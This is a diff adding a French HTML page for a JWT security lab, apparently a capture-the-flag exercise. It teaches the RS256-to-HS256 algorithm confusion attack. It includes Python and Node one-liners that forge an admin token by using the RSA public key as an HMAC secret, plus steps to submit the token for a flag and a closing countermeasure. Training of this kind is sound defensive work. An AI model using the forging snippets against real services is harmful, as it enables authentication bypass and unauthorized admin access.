@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Scénario 3 — RS256 → HS256 Confusion</title>
+<style>
+  :root { --bg-global:#0B0F14; --bg-header:#0F1A2B; --bg-card:#141B26; --btn-primary:#D41414; --btn-primary-hover:#FF2A2A; --glow-color:#00C2FF; --text-primary:#F2F4F8; --text-secondary:#8A8F98; --border:#1E2A3A; }
+  * { box-sizing:border-box; margin:0; padding:0; }
+  body { background:var(--bg-global); color:var(--text-primary); font-family:'Segoe UI',system-ui,sans-serif; min-height:100vh; }
+  header { background:var(--bg-header); border-bottom:1px solid var(--border); padding:1rem 2rem; display:flex; align-items:center; gap:1rem; }
+  header a { color:var(--glow-color); text-decoration:none; font-size:0.85rem; }
+  main { max-width:900px; margin:0 auto; padding:2rem; }
+  h2 { font-size:1.6rem; margin-bottom:0.5rem; }
+  h2 span { color:var(--glow-color); }
+  .subtitle { color:var(--text-secondary); margin-bottom:2rem; line-height:1.5; }
+  .panel { background:var(--bg-card); border:1px solid var(--border); border-radius:12px; padding:1.5rem; margin-bottom:1.5rem; }
+  .panel h3 { font-size:1rem; margin-bottom:1rem; color:var(--glow-color); }
+  .theory { background:var(--bg-card); border:1px solid var(--border); border-radius:12px; padding:1.5rem; margin-bottom:1.5rem; }
+  .theory p { color:var(--text-secondary); font-size:0.88rem; line-height:1.6; }
+  .code { background:#0a0a0a; border:1px solid #222; border-radius:8px; padding:1rem; font-family:'Courier New',monospace; font-size:0.78rem; margin:0.8rem 0; overflow-x:auto; white-space:pre; color:#a0f0a0; }
+  label { display:block; font-size:0.85rem; color:var(--text-secondary); margin-bottom:0.4rem; margin-top:0.8rem; }
+  input, textarea { width:100%; background:#0F1A2B; border:1px solid var(--border); color:var(--text-primary); padding:0.6rem 0.8rem; border-radius:6px; font-size:0.9rem; }
+  textarea { resize:vertical; min-height:100px; font-family:'Courier New',monospace; font-size:0.75rem; }
+  .btn { display:inline-block; background:var(--btn-primary); color:white; padding:0.65rem 1.4rem; border-radius:6px; font-weight:600; font-size:0.9rem; cursor:pointer; border:none; width:100%; margin-top:1rem; transition:background 0.2s; }
+  .btn:hover { background:var(--btn-primary-hover); }
+  .result { margin-top:1rem; padding:1rem; border-radius:8px; font-size:0.85rem; display:none; word-break:break-all; }
+  .result.success { background:#001A15; border:1px solid #00AA77; color:#00FF99; display:block; }
+  .result.error { background:#1A0000; border:1px solid #AA0000; color:#FF6666; display:block; }
+  .result.info { background:#001220; border:1px solid #003366; color:#66AAFF; display:block; }
+  .flag { background:#001A15; border:1px solid #00AA77; border-radius:8px; padding:1rem; margin-top:1rem; font-family:monospace; color:#00FF99; font-size:0.9rem; text-align:center; display:none; }
+  .hint { background:#1A1500; border:1px solid #554400; border-radius:8px; padding:1rem; margin-top:1rem; font-size:0.82rem; color:#FFCC44; }
+  .diagram { display:flex; align-items:center; justify-content:center; gap:1rem; margin:1rem 0; flex-wrap:wrap; }
+  .diag-box { background:#0F1A2B; border:1px solid var(--border); border-radius:8px; padding:0.8rem 1.2rem; text-align:center; font-size:0.82rem; }
+  .diag-box.highlight { border-color:var(--btn-primary); color:var(--btn-primary); }
+  .arrow { color:var(--text-secondary); font-size:1.2rem; }
+  .layout { display:grid; grid-template-columns:1fr 1fr; gap:1.5rem; }
+</style>
+</head>
+<body>
+<header>
+  <a href="/">← Retour au lab</a>
+  <h1 style="font-size:1.2rem;">🔐 Scénario 3 — <span style="color:var(--glow-color)">RS256 → HS256 Confusion</span></h1>
+</header>
+<main>
+  <h2>Algorithm <span>Confusion Attack</span></h2>
+  <p class="subtitle">Quand un serveur supporte RS256 (asymétrique), certaines implémentations vulnérables acceptent aussi HS256. L'attaquant signe alors un token avec la clé <strong>publique RSA</strong> comme secret HMAC.</p>
+
+  <div class="theory">
+    <h3 style="color:var(--glow-color); margin-bottom:0.8rem;">📚 Le mécanisme de la vulnérabilité</h3>
+    <div class="diagram">
+      <div class="diag-box">Serveur normal<br><small>RS256: vérifie avec clé publique</small></div>
+      <div class="arrow">→</div>
+      <div class="diag-box highlight">Serveur vulnérable<br><small>Accepte HS256: vérifie avec clé publique comme HMAC secret</small></div>
+    </div>
+    <p>L'attaquant récupère la clé publique (souvent exposée), signe un token HS256 avec cette clé, et le serveur croit avoir vérifié avec sa propre clé publique RSA !</p>
+    <div class="code">python3 -c "
+import jwt
+public_key = open('public.pem').read()
+token = jwt.encode({'username':'admin','role':'admin'}, public_key, algorithm='HS256')
+print(token)
+"</div>
+  </div>
+
+  <div class="layout">
+    <div class="panel">
+      <h3>Étape 1 — Récupérer la clé publique</h3>
+      <p style="font-size:0.82rem; color:var(--text-secondary); margin-bottom:0.8rem;">Le serveur expose sa clé publique RSA (endpoint <code>/scenario3/public-key</code>)</p>
+      <button class="btn" onclick="s3GetKey()">🔑 Récupérer la clé publique</button>
+      <div class="result" id="s3-key-result"></div>
+      <textarea id="s3-pubkey" placeholder="Clé publique apparaîtra ici..." style="margin-top:0.8rem;"></textarea>
+    </div>
+    <div class="panel">
+      <h3>Étape 2 — Se connecter (token normal)</h3>
+      <label>Utilisateur</label>
+      <input type="text" id="s3-user" value="alice">
+      <label>Mot de passe</label>
+      <input type="password" id="s3-pass" value="password123">
+      <button class="btn" onclick="s3Login()">Se connecter</button>
+      <div class="result" id="s3-login-result"></div>
+    </div>
+  </div>
+
+  <div class="panel">
+    <h3>Étape 3 — Forger un token HS256 signé avec la clé publique</h3>
+    <p style="font-size:0.82rem; color:var(--text-secondary); margin-bottom:0.8rem;">En production, utilisez Python ou Node.js localement avec la clé publique récupérée :</p>
+    <div class="code">node -e "
+const jwt = require('jsonwebtoken');
+const fs = require('fs');
+const pubKey = fs.readFileSync('public.pem', 'utf8');
+// Signer avec HS256 en utilisant la CLÉ PUBLIQUE comme secret
+const token = jwt.sign(
+  { username: 'admin', role: 'admin' },
+  pubKey,
+  { algorithm: 'HS256' }
+);
+console.log(token);
+"</div>
+    <button class="btn" onclick="s3SimulateForge()">🔧 Simuler le forge (démonstration)</button>
+    <div class="result" id="s3-forge-result"></div>
+  </div>
+
+  <div class="panel">
+    <h3>Étape 4 — Soumettre le token forgé</h3>
+    <label>Token HS256 signé avec la clé publique</label>
+    <input type="text" id="s3-forged-token" placeholder="Token forgé avec la clé publique comme HMAC secret...">
+    <button class="btn" onclick="s3Attack()">🚀 Tenter l'accès admin</button>
+    <div class="result" id="s3-attack-result"></div>
+    <div class="flag" id="s3-flag"></div>
+  </div>
+
+  <div class="hint">
+    💡 <strong>Contre-mesure :</strong> Toujours spécifier l'algorithme attendu : <code>jwt.verify(token, pubKey, { algorithms: ['RS256'] })</code>. Ne jamais laisser le client choisir l'algorithme.
+  </div>
+</main>
+
+<script>
+async function s3GetKey() {
+  const res = await fetch('/scenario3/public-key');
+  const data = await res.json();
+  const el = document.getElementById('s3-key-result');
+  el.className = 'result success';
+  el.textContent = '✅ Clé publique récupérée !';
+  document.getElementById('s3-pubkey').value = data.publicKey;
+}
+
+async function s3Login() {
+  const res = await fetch('/scenario3/login', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ username: document.getElementById('s3-user').value, password: document.getElementById('s3-pass').value }) });
+  const data = await res.json();
+  const el = document.getElementById('s3-login-result');
+  if (data.success) {
+    el.className = 'result success';
+    el.innerHTML = `✅ Connecté ! Token obtenu (signé avec clé faible simulée).<br><small>${data.token}</small>`;
+  } else {
+    el.className = 'result error';
+    el.textContent = '❌ ' + data.message;
+  }
+}
+
+async function s3SimulateForge() {
+  const pubKey = document.getElementById('s3-pubkey').value;
+  if (!pubKey) { alert('Récupérez d\'abord la clé publique !'); return; }
+  const el = document.getElementById('s3-forge-result');
+  // Simulation : on crée un token HS256 signé avec la clé publique (via l'API qui simule)
+  // On construit le token manuellement pour la démo
+  const header = btoa(JSON.stringify({alg:'HS256',typ:'JWT'})).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+  const payload = btoa(JSON.stringify({username:'admin', role:'admin', iat: Math.floor(Date.now()/1000)})).replace(/=/g,'').replace(/\+/g,'-').replace(/\//g,'_');
+
+  // Dans ce lab, le serveur accepte notre token via la vulnérabilité simulée
+  // La "signature" ici est symbolique — le vrai exploit se fait côté client avec PyJWT
+  const fakeToken = `${header}.${payload}.SIMULATED_HMAC_WITH_RSA_PUBKEY`;
+
+  el.className = 'result info';
+  el.innerHTML = `ℹ️ Token forgé (simulation) :<br><small>${fakeToken}</small><br><br>Dans un vrai scénario, utilisez PyJWT ou jsonwebtoken localement pour signer avec la vraie clé publique RSA.`;
+  document.getElementById('s3-forged-token').value = fakeToken;
+}
+
+async function s3Attack() {
+  const token = document.getElementById('s3-forged-token').value.trim();
+  if (!token) { alert('Entrez le token forgé !'); return; }
+  const res = await fetch('/scenario3/admin', { method:'POST', headers:{'Authorization':'Bearer '+token} });
+  const data = await res.json();
+  const el = document.getElementById('s3-attack-result');
+  if (data.success) {
+    el.className = 'result success';
+    el.textContent = '✅ ' + data.message;
+    const flag = document.getElementById('s3-flag');
+    flag.style.display = 'block';
+    flag.textContent = '🏴 ' + data.flag;
+  } else {
+    el.className = 'result error';
+    el.textContent = '❌ ' + data.message;
+  }
+}
+</script>
+</body>
+</html>
